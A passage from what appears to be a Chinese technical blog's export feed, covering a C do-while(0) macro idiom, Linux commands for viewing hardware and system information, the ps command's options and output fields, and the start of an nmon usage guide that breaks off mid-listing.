class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  Swap(a, b)  do &#123;  \</span></span><br><span class="line"><span class="keyword">int</span> x = a;             \</span><br><span class="line">a = b;   \</span><br><span class="line">b = x;   \</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="literal">true</span> )</span><br><span class="line">Swap(<span class="number">1</span>, <span class="number">2</span>);  <span class="comment">// 调用宏;</span></span><br></pre></td></tr></table></figure><p>变形为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="literal">true</span> )</span><br><span class="line"> <span class="keyword">do</span> &#123;  </span><br><span class="line"><span class="keyword">int</span> x = a;             </span><br><span class="line">a = b;   </span><br><span class="line">b = x;   </span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)       <span class="comment">// 不存在任何语法上的歧义，总能得到正确结果;</span></span><br></pre></td></tr></table></figure><p>不使用 do-while(0):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="literal">true</span> )</span><br><span class="line"><span class="keyword">int</span> x = a;             </span><br><span class="line">a = b;   </span><br><span class="line">b = x;</span><br></pre></td></tr></table></figure><p>解析的结果是不同的, 造成歧义</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>查看硬件信息</title>
      <link href="/2017/10/15/commands/Linux-%E6%9F%A5%E7%9C%8B%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/"/>
      <url>/2017/10/15/commands/Linux-%E6%9F%A5%E7%9C%8B%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="查看信息命令"><a href="#查看信息命令" class="headerlink" title="查看信息命令"></a>查看信息命令</h3><p><strong>系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uname -a               # 查看内核/操作系统/CPU信息</span><br><span class="line">head -n 1 /etc/issue   # 查看操作系统版本 </span><br><span class="line">cat /proc/cpuinfo      # 查看CPU信息</span><br><span class="line">hostname               # 查看计算机名 </span><br><span class="line">lspci -tv              # 列出所有PCI设备</span><br><span class="line">lsusb -tv              # 列出所有USB设备 </span><br><span class="line">lsmod                  # 列出加载的内核模块</span><br><span class="line">env                    # 查看环境变量</span><br></pre></td></tr></table></figure><p><strong>资源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free -m                # 查看内存使用量和交换区使用量 </span><br><span class="line">df -h                  # 查看各分区使用情况 </span><br><span class="line">du -sh &lt;目录名&gt;        # 查看指定目录的大小 </span><br><span class="line">grep MemTotal /proc/meminfo   # 查看内存总量</span><br><span class="line">grep MemFree /proc/meminfo    # 查看空闲内存量</span><br><span class="line">uptime                 # 查看系统运行时间、用户数、负载 </span><br><span class="line">cat /proc/loadavg      # 查看系统负载</span><br></pre></td></tr></table></figure><p><strong>磁盘和分区</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount | column -t      # 查看挂接的分区状态 </span><br><span class="line">fdisk -l               # 查看所有分区 </span><br><span class="line">swapon -s              # 查看所有交换分区</span><br><span class="line">hdparm -i /dev/hda     # 查看磁盘参数(仅适用于IDE设备) </span><br><span class="line">dmesg | grep IDE       # 查看启动时IDE设备检测状况</span><br></pre></td></tr></table></figure><p><strong>网络</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ifconfig               # 查看所有网络接口的属性</span><br><span class="line">iptables -L            # 查看防火墙设置 </span><br><span class="line">route -n               # 查看路由表 </span><br><span class="line">netstat -lntp          # 查看所有监听端口 </span><br><span class="line">netstat -antp          # 查看所有已经建立的连接</span><br><span class="line">netstat -s             # 查看网络统计信息</span><br></pre></td></tr></table></figure><p><strong>进程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef                 # 查看所有进程 </span><br><span class="line">top                    # 实时显示进程状态</span><br></pre></td></tr></table></figure><p><strong>用户</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w                      # 查看活动用户 </span><br><span class="line">id &lt;用户名&gt;            # 查看指定用户信息 </span><br><span class="line">last                   # 查看用户登录日志 </span><br><span class="line">cut -d: -f1 /etc/passwd   # 查看系统所有用户 </span><br><span class="line">cut -d: -f1 /etc/group    # 查看系统所有组 </span><br><span class="line">crontab -l             # 查看当前用户的计划任务</span><br></pre></td></tr></table></figure><p><strong>服务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list       # 列出所有系统服务 </span><br><span class="line">chkconfig --list | grep on    # 列出所有启动的系统服务</span><br></pre></td></tr></table></figure><p><strong>程序</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa                # 查看所有安装的软件包</span><br></pre></td></tr></table></figure><a id="more"></a> <p>常用命令整理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">查看主板的序列号: dmidecode | grep -i ’serial number’</span><br><span class="line">用硬件检测程序kuduz探测新硬件：service kudzu start ( or restart)</span><br><span class="line">查看CPU信息：cat /proc/cpuinfo [dmesg | grep -i &apos;cpu&apos;][dmidecode -t processor]</span><br><span class="line">查看内存信息：cat /proc/meminfo [free -m][vmstat]</span><br><span class="line">查看板卡信息：cat /proc/pci</span><br><span class="line">查看显卡/声卡信息：lspci |grep -i ‘VGA’[dmesg | grep -i &apos;VGA&apos;]</span><br><span class="line">查看网卡信息：dmesg | grep -i ‘eth’[cat /etc/sysconfig/hwconf | grep -i eth][lspci | grep -i &apos;eth&apos;]</span><br><span class="line">查看PCI信息：lspci (相比cat /proc/pci更直观）</span><br><span class="line">查看USB设备：cat /proc/bus/usb/devices</span><br><span class="line">查看键盘和鼠标:cat /proc/bus/input/devices</span><br><span class="line">查看系统硬盘信息和使用情况：fdisk &amp; disk – l &amp; df</span><br><span class="line">查看各设备的中断请求(IRQ):cat /proc/interrupts</span><br><span class="line">查看系统体系结构：uname -a</span><br><span class="line">查看及启动系统的32位或64位内核模式：isalist –v [isainfo –v][isainfo –b]</span><br><span class="line"></span><br><span class="line">dmidecode查看硬件信息，包括bios、cpu、内存等信息</span><br><span class="line">测定当前的显示器刷新频率：/usr/sbin/ffbconfig –rev \?</span><br><span class="line">查看系统配置：/usr/platform/sun4u/sbin/prtdiag –v</span><br><span class="line">查看当前系统中已经应用的补丁：showrev –p</span><br><span class="line">显示当前的运行级别：who –rH</span><br><span class="line"></span><br><span class="line">查看当前的bind版本信息：nslookup –class=chaos –q=txt version.bind</span><br><span class="line">dmesg | more 查看硬件信息</span><br><span class="line">lspci 显示外设信息, 如usb，网卡等信息</span><br><span class="line">lsnod 查看已加载的驱动</span><br><span class="line">lshw</span><br><span class="line">psrinfo -v 查看当前处理器的类型和速度（主频）</span><br><span class="line">prtconf -v 打印当前的OBP版本号</span><br><span class="line">iostat –E 查看硬盘物理信息(vendor, RPM, Capacity)</span><br><span class="line">prtvtoc /dev/rdsk/c0t0d0s 查看磁盘的几何参数和分区信息</span><br><span class="line">df –F ufs –o i 显示已经使用和未使用的i-node数目</span><br><span class="line">isalist –v</span><br><span class="line"></span><br><span class="line">对于“/proc”中文件可使用文件查看命令浏览其内容，文件中包含系统特定信息：</span><br><span class="line">Cpuinfo 主机CPU信息</span><br><span class="line">Dma 主机DMA通道信息</span><br><span class="line">Filesystems 文件系统信息</span><br><span class="line">Interrupts 主机中断信息</span><br><span class="line">Ioprots 主机I/O端口号信息</span><br><span class="line">Meninfo 主机内存信息</span><br><span class="line">Version Linux内存版本信息</span><br></pre></td></tr></table></figure><p>备注： proc – process information pseudo-filesystem 进程信息伪装文件<strong>系统</strong></p><h4 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h4><p>lspci - list all PCI devices ，主要是有来列出机器中的PCI 设备，比如声卡、显卡、猫、网卡等，主板集成设备也能列出来；lspci 是读取 hwdata 数据库，hwdata 由软件包 hwdata 提供；大约有如下文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[beinan@localhost ~]# rpm -ql hwdata-0.158-1</span><br><span class="line">/etc/hotplug/blacklist </span><br><span class="line">/etc/pcmcia </span><br><span class="line">/etc/pcmcia/config </span><br><span class="line">/usr/X11R6/lib/X11/Cards </span><br><span class="line">/usr/share/doc/hwdata-0.158 </span><br><span class="line">/usr/share/doc/hwdata-0.158/COPYING </span><br><span class="line">/usr/share/doc/hwdata-0.158/LICENSE </span><br><span class="line">/usr/share/hwdata </span><br><span class="line">/usr/share/hwdata/CardMonitorCombos </span><br><span class="line">/usr/share/hwdata/Cards </span><br><span class="line">/usr/share/hwdata/MonitorsDB </span><br><span class="line">/usr/share/hwdata/pci.ids </span><br><span class="line">/usr/share/hwdata/pcitable </span><br><span class="line">/usr/share/hwdata/upgradelist </span><br><span class="line">/usr/share/hwdata/usb.ids</span><br></pre></td></tr></table></figure><h4 id="查看设备是否正常"><a href="#查看设备是否正常" class="headerlink" title="查看设备是否正常"></a>查看设备是否正常</h4><ol><li><code>cat /proc/devices</code> 是否加载某个设备</li><li><code>lsmod</code> 查看是否存在驱动</li><li><code>cat /proc/pcan</code> 即是设备映射</li><li><code>ls /dev/</code> 查看设备节点</li></ol><h4 id="通过查看-proc-目录的相应文件获取一些硬件信息"><a href="#通过查看-proc-目录的相应文件获取一些硬件信息" class="headerlink" title="通过查看/proc 目录的相应文件获取一些硬件信息"></a>通过查看/proc 目录的相应文件获取一些硬件信息</h4><p>我们在查看 /etc/fstab 时，会注意到这样一行；</p><p><code>/dev/proc /proc proc defaults 0 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proc 看起来象是一个文件系统，其实他并不是一个真正的文件系统 ， 它是“proc - process information pseudo-filesystem”，译成中文大概的意思是“进程信息伪装文件系统”呵呵，这是我翻译的，有可能不对，请多多指正； </span><br><span class="line"></span><br><span class="line">“The proc filesystem is a pseudo-filesystem which is used as an interface to kernel data </span><br><span class="line">structures. It is commonly mounted at /proc. Most of it is read-only, but some files allow </span><br><span class="line">kernel variables to be changed.”</span><br></pre></td></tr></table></figure><pre><code>我再来乱译一下然后再根据/proc 的内容自己理解理解。proc 文件系统做为内核kernel 数据结构的接口，把kernel 的一些信息（比如硬件信息，包括CPU 、网卡、显示卡、内存、文件系统、SCSI 设备 ....）写到 proc 文件系统中，proc被mont 到 /proc 目录；/proc 目录中有大数据大多文件是只读的，但一些数据是根据内核的变化而变化的；/proc 目录中的数据是经常变动的，对于系统中的每个进程都有一个PID；都可以在/proc 中找到；我们也可以通过 ps -aux |more 来查看进程；</code></pre><p>我们可以通过 cat 命令来读取/proc 目录下的文件，比如cpu的信息；</p><p><code>[root@localhost beinan]# cat /proc/cpuinfo</code></p><p>详细的内容还得需要您来慢慢查看；对于 /proc 的了解也是有必要的；</p><h4 id="dmesg"><a href="#dmesg" class="headerlink" title="dmesg"></a>dmesg</h4><p>dmesg 是一个显示内核缓冲区系统控制信息的工具；比如系统在启动时的信息会写到/var/log/</p><p><strong>注：</strong>dmesg 工具并不是专门用来查看硬件芯片组标识的工具，但通过这个工具能让我们知道机器中的硬件的一些参数；因为系统在启动的时候，会写一些硬件相关的日志到 /var/log/message<em> 或 /var/log/boot</em> 文件中；</p><p>如果我们用这个工具来查看一些硬件的信息；这个工具信息量太大，的确需要耐心；</p><p><code>[root@localhost beinan]# dmesg</code></p><p><code>[root@localhost beinan]# dmesg -c 注：清理掉缓冲区，下次开机的时候还会自动生成；</code></p><h3 id="硬件驱动是由内核支持的，但驱动都存放在哪里？"><a href="#硬件驱动是由内核支持的，但驱动都存放在哪里？" class="headerlink" title="硬件驱动是由内核支持的，但驱动都存放在哪里？"></a>硬件驱动是由内核支持的，但驱动都存放在哪里？</h3><p>硬件驱动是必须由内核支持的，无论是我们自己安装驱动，还是内核自带的驱动都是如此。硬件驱动如果是以内核模块支持的，驱动目录位于： /lib/modules/内核版本/kernel/目录 或 /lib/modules/内核版本/kernel/drivers 目录中；</p><p><code>[root@localhost beinan]# uname -r 2.6.11-1.1369_FC4 [root@localhost beinan]# ls /lib/modules/2.6.11-1.1369_FC4/kernel arch crypto drivers fs lib net sound</code></p><p><strong>注：</strong>只有驱动在内核中以模块的方法支持的，或者我们自己安装的驱动，驱动才位于 /lib/modules/相应的目录；如果是直接置入内核的，不会出现在/lib/modules驱动相关的目录；</p>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ps</title>
      <link href="/2017/10/11/commands/Linux-ps/"/>
      <url>/2017/10/11/commands/Linux-ps/</url>
      
        <content type="html"><![CDATA[<p>Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用htop/top命令。</p><p>ps命令支持三种使用的语法格式:</p><ol><li>UNIX 风格，选项可以组合在一起，并且选项前必须有“-”连字符</li><li>BSD 风格，选项可以组合在一起，但是选项前不能有“-”连字符</li><li>GNU 风格的长选项，选项前有两个“-”连字符</li></ol><p><br><br><a id="more"></a></p><p><strong>linux上进程有5种状态:</strong></p><ol><li>运行(正在运行或在运行队列中等待)</li><li>中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号)</li><li>不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生)</li><li>僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放)</li><li>停止(进程收到SIGSTOP, SIGTSTP, SIGTTIN, SIGTTOU信号后停止运行运行)</li></ol><p>ps工具标识进程的5种状态码:</p><ul><li>D 不可中断 uninterruptible sleep (usually IO)</li><li>R 运行 runnable (on run queue)</li><li>S 中断 sleeping</li><li>T 停止 traced or stopped</li><li>Z 僵死 a defunct (”zombie”) process</li></ul><h4 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h4><ul><li>a  显示所有进程</li><li>-a 显示同一终端下的所有程序</li><li>-A 显示所有进程</li><li>c  显示进程的真实名称</li><li>-N 反向选择</li><li>-e 等于“-A”</li><li>e  显示环境变量</li><li>f  显示程序间的关系</li><li>-H 显示树状结构</li><li>r  显示当前终端的进程</li><li>T  显示当前终端的所有程序</li><li>u  指定用户的所有进程</li><li>-au 显示较详细的资讯</li><li>-aux 显示所有包含其他使用者的行程 </li><li>-C&lt;命令&gt; 列出指定命令的状况</li><li>–lines&lt;行数&gt; 每页显示的行数</li><li>–width&lt;字符数&gt; 每页显示的字符数</li><li>–help 显示帮助信息</li><li>–version 显示版本显示</li></ul><p><strong>-o:</strong></p><p>OBSOLETE SORT KEYS<br>​       These keys are used by the BSD O option (when it is used for sorting).  The GNU –sort option doesn’t use these keys, but the specifiers described below in the STANDARD FORMAT SPECIFIERS section.  Note that the values used in sorting are the internal<br>​       values ps uses and not the “cooked” values used in some of the output format fields (e.g.  sorting on tty will sort into device number, not according to the terminal name displayed).  Pipe ps output into the sort(1) command if you want to sort the cooked<br>​       values.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">KEY   LONG         DESCRIPTION       </span><br><span class="line"> c     cmd          simple name of executable</span><br><span class="line"> C     pcpu         cpu utilization</span><br><span class="line"> f     flags        flags as <span class="keyword">in</span> long format F field</span><br><span class="line"> g     pgrp         <span class="keyword">process</span> group ID</span><br><span class="line"> G     tpgid        controlling tty <span class="keyword">process</span> group ID</span><br><span class="line"> j     cutime       cumulative user time</span><br><span class="line"> J     cstime       cumulative system time</span><br><span class="line"> k     utime        user time</span><br><span class="line"> m     min_flt      number of minor page faults</span><br><span class="line"> M     maj_flt      number of major page faults</span><br><span class="line"> n     cmin_flt     cumulative minor page faults</span><br><span class="line"> N     cmaj_flt     cumulative major page faults</span><br><span class="line"> o     session      session ID</span><br><span class="line"> p     pid          <span class="keyword">process</span> ID</span><br><span class="line"> P     ppid         parent <span class="keyword">process</span> ID</span><br><span class="line"> r     rss          resident set size</span><br><span class="line"> R     resident     resident pages</span><br><span class="line"> s     size         memory size <span class="keyword">in</span> kilobytes</span><br><span class="line"> S     share        amount of shared pages</span><br><span class="line"> t     tty          the device number of the controlling tty</span><br><span class="line"> T     start_time   time <span class="keyword">process</span> was started</span><br><span class="line"> U     uid          user ID number</span><br><span class="line"> u     user         user name</span><br><span class="line"> v     vsize        total VM size <span class="keyword">in</span> KiB</span><br><span class="line"></span><br><span class="line"> y     priority     kernel scheduling priority</span><br></pre></td></tr></table></figure><p>AIX FORMAT DESCRIPTORS<br>​       This ps supports AIX format descriptors, which work somewhat like the formatting codes of printf(1) and printf(3).  For example, the normal default output can be produced with this: ps -eo “%p %y %x %c”.  The NORMAL codes are described in the next section.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CODE   NORMAL   HEADER</span><br><span class="line">%C     pcpu     %CPU</span><br><span class="line">%G     group    GROUP</span><br><span class="line">%P     ppid     PPID</span><br><span class="line">%U     user     USER</span><br><span class="line">%a     args     COMMAND</span><br><span class="line">%c     comm     COMMAND</span><br><span class="line">%g     rgroup   RGROUP</span><br><span class="line">%n     nice     NI</span><br><span class="line">%p     pid      PID</span><br><span class="line">%r     pgid     PGID</span><br><span class="line">%t     etime    ELAPSED</span><br><span class="line">%u     ruser    RUSER</span><br><span class="line">%x     time     TIME</span><br><span class="line">%y     tty      TTY</span><br><span class="line">%z     vsz      VSZ</span><br></pre></td></tr></table></figure><h4 id="输出列的含义"><a href="#输出列的含义" class="headerlink" title="输出列的含义"></a>输出列的含义</h4><ul><li>F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user</li><li>UID 程序被该 UID 所拥有</li><li>PID 进程的ID</li><li>PPID 则是其上级父程序的ID</li><li>PRI 这个是 Priority (优先执行序) 的缩写，详细后面介绍</li><li>NI 这个是 Nice 值，在下一小节我们会持续介绍</li><li>ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 “-“</li><li>WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作</li><li>USER：该 process 属于那个使用者账号的</li><li>%CPU：该 process 使用掉的 CPU 资源百分比</li><li>%MEM：该 process 所占用的物理内存百分比</li><li>VSZ ：该 process 使用掉的虚拟内存量 (Kbytes)</li><li>RSS ：该 process 占用的固定的内存量 (Kbytes)</li><li>TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。</li><li>STAT：该程序目前的状态，主要的状态有<ul><li>R ：该程序目前正在运作，或者是可被运作</li><li>S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。</li><li>T ：该程序目前正在侦测或者是停止了</li><li>Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态</li></ul></li></ul><ul><li>START：该 process 被触发启动的时间</li><li>TIME ：该 process 实际使用 CPU 运作的时间</li><li>COMMAND：该程序的实际指令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep postgre</span><br><span class="line">ps aux | grep postgre</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_72/com.ibm.aix.cmds4/ps.htm" target="_blank" rel="noopener">IBM-ps</a></p>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
          <category> 性能监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 性能监控 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nmon</title>
      <link href="/2017/10/10/commands/Linux-nmon/"/>
      <url>/2017/10/10/commands/Linux-nmon/</url>
      
        <content type="html"><![CDATA[<p>以交互方式显示本地系统统计信息并以记录方式记录系统统计信息。</p><p><img src="img/linux/linux_command_nmon.png" alt="index"></p><p><strong>基本命令:</strong></p><ul><li><code>q</code> : 停止并退出 Nmon</li><li><code>h</code> : 查看帮助</li><li><code>c</code> : 查看 CPU 统计数据</li><li><code>m</code> : 查看内存统计数据</li><li><code>d</code> : 查看硬盘统计数据</li><li><code>k</code> : 查看内核统计数据</li><li><code>n</code> : 查看网络统计数据</li><li><code>N</code> : 查看 NFS 统计数据</li><li><code>j</code> : 查看文件系统统计数据</li><li><code>t</code> : 查看高耗进程</li><li><code>V</code> : 查看虚拟内存统计数据</li><li><code>v</code> : 详细模式</li></ul><p><br><br><a id="more"></a></p><p><strong>命令详细</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">Hint: nmon.sh [-h] [-s &lt;seconds&gt;] [-c &lt;count&gt;] [-f -d &lt;disks&gt; -t -r &lt;name&gt;] [-x]</span><br><span class="line"> </span><br><span class="line">        -h            查看完整的说明信息，有两种模式：a、命令行交互式模式 (h) b、对于数据收集模式 (-f)</span><br><span class="line">        -f            电子表格的输出格式 [注意：默认 -s300 -c288] 可选 (300秒*288次=86400秒=60*60*24=1天)</span><br><span class="line">        -s &lt;seconds&gt;  刷新屏幕频率的时间 [默认 2]</span><br><span class="line">        -c &lt;number&gt;   刷新屏幕的次数 [默认 1000000]</span><br><span class="line">        -d &lt;disks&gt;    to increase the number of disks [default 256]</span><br><span class="line">        -t            spreadsheet includes top processes</span><br><span class="line">        -x            capacity planning (每15分钟1天 = -fdt -s 900 -c 96)</span><br><span class="line">版本 - nmon 14g</span><br><span class="line">对于命令行交互式模式</span><br><span class="line">        -s &lt;seconds&gt;  刷新屏幕频率的时间 [默认 2]</span><br><span class="line">        -c &lt;number&gt;   刷新屏幕的次数 [默认 1000000]</span><br><span class="line">        -g &lt;filename&gt; User Defined Disk Groups [hit g to show them]</span><br><span class="line">                      - file = on each line: group_name &lt;disks list&gt; space separated</span><br><span class="line">                      - like: database sdb sdc sdd sde</span><br><span class="line">                      - upto 64 disk groups, 512 disks per line</span><br><span class="line">                      - disks can appear more than once and in many groups</span><br><span class="line">        -b            命令行交互模式的界面是黑色和白色 [默认的颜色]</span><br><span class="line">        例如: nmon.sh -s 1 -c 100 (说明：在命令行交互模式下，每秒钟刷新一次屏幕，总共采集100次)</span><br><span class="line"> </span><br><span class="line">对于数据收集模式 = 电子表格格式 （逗号分隔值）</span><br><span class="line">        Note: use only one of f,F,z,x or X and make it the first argument</span><br><span class="line">        -f            电子表格输出格式 [注意: default -s300 -c288]</span><br><span class="line">                         输出文件是 &lt;hostname&gt;_YYYYMMDD_HHMM.nmon</span><br><span class="line">        -F &lt;filename&gt; 等同于 -f 但是使用用户提供的文件名</span><br><span class="line">        -r &lt;runname&gt;  用于电子表格文件 [default hostname]</span><br><span class="line">        -t            include top processes in the output</span><br><span class="line">        -T            as -t plus saves command line arguments in UARG section</span><br><span class="line">        -s &lt;seconds&gt;  采集数据的时间</span><br><span class="line">        -c &lt;number&gt;   采集数据的次数</span><br><span class="line">        -d &lt;disks&gt;    to increase the number of disks [default 256]</span><br><span class="line">        -l &lt;dpl&gt;      disks/line default 150 to avoid spreadsheet issues. EMC=64.</span><br><span class="line">        -g 